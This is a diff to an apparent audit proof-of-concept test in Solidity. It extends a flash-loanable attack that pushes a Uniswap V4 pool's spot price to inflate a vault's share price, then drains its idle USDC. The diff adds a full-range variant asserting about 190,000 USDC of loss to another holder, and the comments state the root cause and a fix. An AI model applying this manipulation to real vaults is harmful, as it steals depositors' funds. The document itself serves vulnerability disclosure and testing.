@@ -20,15 +20,17 @@ contract FlashExitAttacker {
         bytes32 poolId,
         int24 fairTick,
         int24 movedTick,
-        uint256 amount
+        uint256 amount,
+        bool drainIdle
     ) external returns (uint256 usdcPaid) {
         usdc.approve(address(core), amount);
         // 1. Mint at the fair Share Price.
         core.deposit(amount, 0);
         // 2. First leg: push the pool's spot price away from the oracle price.
         pool.setTick(poolId, movedTick);
-        // 3. Exit everything at the inflated Share Price, paid from Idle. No term, no lock (Instant Payout).
-        core.requestPayout(1_000_000_000e6, ICoreVault.PayoutMode.Instant);
+        // 3. Exit at the inflated Share Price, paid from Idle. No term, no lock (Instant Payout). Asking for exactly
+        //    Free Idle keeps the claim Idle-paid (no unwind), so the inflated value is never tested against a sale.
+        core.requestPayout(drainIdle ? core.freeIdle() : 1_000_000_000e6, ICoreVault.PayoutMode.Instant);
         usdcPaid = core.claimPayout("").usdcPaid;
         // 4. Second leg: bring the pool back.
         pool.setTick(poolId, fairTick);
@@ -37,7 +39,8 @@ contract FlashExitAttacker {
 
 /// @title PoC: Share Assets value Uniswap V4 principal at the pool's spot composition, so a spot move inside one
 ///        transaction inflates the Share Price and an exit paid from Idle keeps the difference
-/// @notice Severity: HIGH (direct theft from the remaining Shareholders, atomic, flash-loanable, no privilege).
+/// @notice Severity: CRITICAL (direct theft of customer funds from the remaining Shareholders: atomic, flash-loanable,
+///         no privilege; bounded only by Free Idle when the fund holds a wide or full-range position).
 ///
 /// Root cause: `UniswapV4Adapter.positionValue` reports `principal0` / `principal1` as the token amounts the position
 /// holds at the pool's CURRENT `slot0` price (`_principal`), and `CoreVaultLogic._positionsPrincipal` values those
@@ -55,11 +58,16 @@ contract FlashExitAttacker {
 ///     at the inflated Share Price and paid from Idle;
 ///  4. swap back (second leg), repay the loan.
 ///
-/// Impact: with a position of +-50 % around the price holding 80 % of a 1,000,000 USDC fund, the measured position
-/// value rises about 11 % and the attacker nets about 12,000 USDC in one transaction after paying the deposit flow
-/// fee, the 2 % Payout Fee and the payout flow fee, for roughly 500 USDC of pool fees; the remaining Shareholder
-/// loses about 20,000 USDC. Wider ranges inflate more (a full-range position has no bound), a matured Standard
-/// Payout Request removes the 2 % fee, and the payout is bounded only by Free Idle.
+/// Impact (both tests, a 1,000,000 USDC fund with 800,000 USDC in one hub position and about 0.05 % pool fee):
+///  - range of about -33 % / +50 % around the price (`test_POC_sharePriceInflatedByPoolSpotMoveInOneTransaction`): the
+///    measured position value rises about 11 %; the attacker nets about 12,700 USDC in one transaction after the
+///    deposit flow fee, the 2 % Payout Fee and the payout flow fee, for about 500 USDC of pool fees; the remaining
+///    Shareholder loses about 20,700 USDC;
+///  - full range (`test_POC_fullRangePositionLetsAHolderDrainAllFreeIdle`): the inflation is unbounded, so a 100,000
+///    USDC entrant prices its shares above the whole Free Idle and takes all of it, about 190,000 USDC of other
+///    people's money for about 2,800 USDC of pool fees, and still holds shares afterwards.
+/// A matured Standard Payout Request removes the 2 % fee. The claim must stay Idle-paid (an unwind would sell at the
+/// moved price and make the attacker's first leg real), which the attacker controls with the amount it requests.
 ///
 /// Fix: never value a price-dependent position from its spot composition. Value it from `liquidity`, `tickLower`,
 /// `tickUpper` (already in `PositionValue` and in the report) at the sqrt price implied by the oracle price, and/or
@@ -96,7 +104,7 @@ contract SharePriceSpotManipulationPoC is AccountingPocFixture {
         FlashExitAttacker attacker = new FlashExitAttacker();
         usdc.mint(address(attacker), FLASH_LOAN);
         _refreshPrices();
-        uint256 paid = attacker.attack(core, usdc, v4, hubPoolId, TICK_FAIR, TICK_MOVED, FLASH_LOAN);
+        uint256 paid = attacker.attack(core, usdc, v4, hubPoolId, TICK_FAIR, TICK_MOVED, FLASH_LOAN, false);
 
         // The flash loan is repaid out of the attacker's balance; what is left is profit before pool fees.
         uint256 balance = usdc.balanceOf(address(attacker));
@@ -120,6 +128,46 @@ contract SharePriceSpotManipulationPoC is AccountingPocFixture {
         emit log_named_decimal_uint("Share Assets at moved spot (USDC)", inflatedAssets, 6);
         emit log_named_decimal_uint("attacker profit before pool fees (USDC)", grossProfit, 6);
         emit log_named_decimal_uint("pool fees of the sandwich (USDC)", poolFees, 6);
+        emit log_named_decimal_uint("Alice loss (USDC)", aliceLoss, 6);
+    }
+
+    /// @notice The same attack against a full-range position: the inflation has no bound, so a holder of 9 % of the
+    ///         shares prices them above the whole Free Idle and takes all of it.
+    /// @dev Spot is pushed to 64 times the oracle price (41,590 ticks). A full-range position then reads as 4 times
+    ///      its fair value at the oracle price. The attacker asks for exactly Free Idle, so the claim is Idle-paid.
+    function test_POC_fullRangePositionLetsAHolderDrainAllFreeIdle() public {
+        int24 movedTick = TICK_FAIR + 41_590;
+        _deposit(alice, 1_000_000e6);
+        bytes32 positionKey = _openHubPositionAt(800_000e6, -887_270, 887_270);
+        uint256 aliceFair = _valueOf(alice);
+        uint256 fairPrice = core.sharePrice();
+
+        FlashExitAttacker attacker = new FlashExitAttacker();
+        uint256 loan = 100_000e6;
+        usdc.mint(address(attacker), loan);
+        _refreshPrices();
+        attacker.attack(core, usdc, v4, hubPoolId, TICK_FAIR, movedTick, loan, true);
+
+        // Every USDC of Free Idle left the Core Vault: Alice's uninvested 197,500 USDC and the attacker's own deposit.
+        assertLt(core.freeIdle(), 5e6, "Free Idle is drained to dust");
+        uint256 grossProfit = usdc.balanceOf(address(attacker)) - loan;
+        assertGt(grossProfit, 185_000e6, "more than 185,000 USDC out of a 1,000,000 USDC fund in one transaction");
+        assertGt(shares.balanceOf(address(attacker)), 0, "and the attacker still holds shares");
+
+        uint128 liquidity = hubV4.positionValue(positionKey).liquidity;
+        uint256 usdcIn = SqrtPriceMath.getAmount1Delta(
+            TickMath.getSqrtPriceAtTick(TICK_FAIR), TickMath.getSqrtPriceAtTick(movedTick), liquidity, true
+        );
+        uint256 poolFees = 2 * usdcIn * POOL_FEE_PIPS / 1e6;
+        assertGt(grossProfit, 50 * poolFees, "profit is more than 50 times the cost of moving the pool");
+
+        assertApproxEqRel(core.sharePrice(), fairPrice * 80 / 100, 0.02e18, "the Share Price lost about 20 %");
+        uint256 aliceLoss = aliceFair - _valueOf(alice);
+        assertGt(aliceLoss, 190_000e6, "Alice lost more than 190,000 USDC");
+
+        emit log_named_decimal_uint("attacker profit before pool fees (USDC)", grossProfit, 6);
+        emit log_named_decimal_uint("pool fees of the sandwich (USDC)", poolFees, 6);
+        emit log_named_decimal_uint("Free Idle left (USDC)", core.freeIdle(), 6);
         emit log_named_decimal_uint("Alice loss (USDC)", aliceLoss, 6);
     }
 
